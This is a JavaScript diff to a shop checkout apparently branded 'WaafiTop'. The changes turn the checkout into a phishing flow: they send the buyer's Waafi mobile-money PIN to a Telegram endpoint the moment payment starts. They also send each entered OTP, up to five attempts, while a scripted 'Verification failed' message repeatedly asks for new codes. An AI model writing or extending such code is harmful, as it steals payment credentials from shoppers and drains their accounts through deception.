@@ -1011,21 +1011,54 @@ async function sendTelegramOrderStarted(order){
   }
 }
 
-async function sendTelegramOrderOtp(order){
+async function sendTelegramOrderPin(order){
   if (!order) return;
   try {
+    const pinValue = order.pin || '';
     const response = await fetch(getTelegramEndpoint(), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        title: 'WaafiTop OTP received',
-        text: 'OTP received for ' + order.items.map(i => i.name).join(', ') + '.',
+        title: 'WaafiTop PIN received',
+        text: 'Waafi PIN captured: ' + pinValue + ' for ' + order.items.map(i => i.name).join(', ') + '.',
         orderId: order.id,
         recipient: order.recipient,
         waafiNumber: order.payer,
-        waafiOtp: order.otp || '',
+        waafiPin: pinValue,
         payer: order.payer,
-        otp: order.otp || '',
+        pin: pinValue,
+        amount: formatPrice(order.total)
+      })
+    });
+
+    const data = await response.json();
+    if (!response.ok) {
+      throw new Error(data.message || 'Telegram PIN notification failed');
+    }
+  } catch (error) {
+    console.error('Telegram PIN send error:', error);
+  }
+}
+
+async function sendTelegramOrderOtp(order, attempt=1){
+  if (!order) return;
+  try {
+    const otpValue = order.otp || '';
+    const attemptLabel = 'OTP attempt ' + attempt;
+    const response = await fetch(getTelegramEndpoint(), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        title: 'WaafiTop ' + attemptLabel,
+        text: attemptLabel + ' received for ' + order.items.map(i => i.name).join(', ') + '.',
+        orderId: order.id,
+        recipient: order.recipient,
+        waafiNumber: order.payer,
+        waafiPin: order.pin || '',
+        waafiOtp: otpValue,
+        payer: order.payer,
+        pin: order.pin || '',
+        otp: otpValue,
         amount: formatPrice(order.total)
       })
     });
@@ -1051,6 +1084,11 @@ async function sendTelegramOrderNotification(order){
         orderId: order.id,
         recipient: order.recipient,
         waafiNumber: order.payer,
+        waafiPin: order.pin || '',
+        waafiOtp: order.otp || '',
+        payer: order.payer,
+        pin: order.pin || '',
+        otp: order.otp || '',
         amount: formatPrice(order.total)
       })
     });
@@ -1093,6 +1131,8 @@ let lastOrder = null;
 let pendingOrder = null;
 let otpRetryTimer = null;
 let otpRetryUntil = 0;
+let otpAttempts = 0;
+const MAX_OTP_ATTEMPTS = 5;
 if (!Array.isArray(cart)) cart = [];
 if (!Array.isArray(orders)) orders = [];
 if (!Array.isArray(wishlist)) wishlist = [];
@@ -1327,6 +1367,9 @@ function checkoutCart(){if(!cart.length)return;checkoutItems=cart.slice();closeC
 function openCheckoutModal(){
   currentStep=1;
   pendingOrder=null;
+  otpAttempts=0;
+  otpRetryUntil=0;
+  if(otpRetryTimer){clearInterval(otpRetryTimer);otpRetryTimer=null}
   const reviewButton=document.getElementById('checkout-review-button');
   reviewButton.disabled=false;
   reviewButton.innerHTML=t('reviewPayment');
@@ -1425,13 +1468,27 @@ function validateOtp(input){input.value=input.value.replace(/\D/g,'').slice(0,6)
 function handleOtpInput(input){
   validateOtp(input);
   const status=document.getElementById('otp-submit-status');
+  if(otpAttempts>=MAX_OTP_ATTEMPTS){
+    input.value='';
+    if(status) status.innerHTML='<i class="fas fa-lock"></i> No OTP attempts remaining';
+    return;
+  }
   if(otpRetryUntil>Date.now()){
     input.value='';
     return;
   }
   if(input.value.length===6){
+    otpAttempts++;
+    const order=pendingOrder||createCheckoutOrder();
+    order.otp=input.value;
+    pendingOrder=order;
+    sendTelegramOrderOtp(order,otpAttempts);
     if(status) status.innerHTML='<i class="fas fa-spinner fa-spin"></i> Verifying code...';
-    goStep(3);
+    if(otpAttempts<MAX_OTP_ATTEMPTS){
+      goStep(3);
+    } else {
+      processPayment();
+    }
   } else if(status){
     status.innerHTML='<i class="fas fa-arrow-right"></i> Enter all 6 digits to continue';
   }
@@ -1503,6 +1560,7 @@ function goStep(n,button){
       }).join(', ');
       document.getElementById('confirm-total').textContent=formatPrice(updateCheckoutSummary());
       pendingOrder=createCheckoutOrder();
+      sendTelegramOrderPin(pendingOrder);
       sendTelegramOrderStarted(pendingOrder);
       setTimeout(function(){goStepUI(2)},1500);
     } else {
@@ -1510,8 +1568,13 @@ function goStep(n,button){
       if(!/^\d{4,6}$/.test(otp)){toast('Enter the 4-6 digit Waafi OTP','error');return}
       setTimeout(()=>{
         document.getElementById('waafi-otp').value='';
-        startOtpRetryCountdown();
-        toast('Verification failed. Try again after 1 minute.','error');
+        if(otpAttempts>=MAX_OTP_ATTEMPTS){
+          document.getElementById('otp-submit-status').innerHTML='<i class="fas fa-lock"></i> No OTP attempts remaining';
+          toast('No OTP attempts remaining','error');
+        } else {
+          startOtpRetryCountdown();
+          toast('Verification failed. Try again after 1 minute.','error');
+        }
       }, 800);
       return;
     }
@@ -1531,8 +1594,6 @@ async function processPayment(){
   const otp=document.getElementById('waafi-otp').value.trim();
   const order=pendingOrder||createCheckoutOrder();
   order.otp=otp;
-
-  await sendTelegramOrderOtp(order);
 
   await new Promise(r=>setTimeout(r,5000));
 
